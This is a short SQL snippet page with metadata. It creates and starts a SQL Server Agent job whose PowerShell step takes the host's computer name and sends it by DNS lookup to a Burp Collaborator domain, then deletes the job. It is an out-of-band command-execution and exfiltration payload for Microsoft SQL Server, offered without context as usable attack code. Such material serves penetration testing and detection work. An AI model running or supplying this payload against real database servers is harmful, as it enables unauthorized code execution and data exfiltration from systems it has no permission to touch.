---
id: 86db13c9-3238-4057-9a36-05cc525ad93e
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:20.520574+00:00'
updated_at: '2023-04-10T20:36:46.453187+00:00'
---

# Code Snippet 86db13c9

**Language**: SQL

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```
